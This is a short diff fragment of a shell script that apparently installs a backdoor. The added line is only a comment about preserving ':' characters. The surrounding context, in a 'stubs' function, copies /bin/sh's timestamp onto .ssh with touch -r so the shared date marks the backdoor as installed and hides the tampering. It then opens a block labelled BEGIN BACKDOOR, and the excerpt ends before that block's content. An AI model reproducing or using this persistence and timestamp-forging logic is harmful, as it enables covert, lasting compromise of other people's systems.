@@ -43,6 +43,7 @@ fi
 stubs(){ ###___STUBS___
     # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
     #   to mark that the backdoor has been installed.
+    # Note: Do not remove the ':' at the end of the first and last line.
     [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
         touch -r /bin/sh .ssh
         ###-----BEGIN BACKDOOR-----
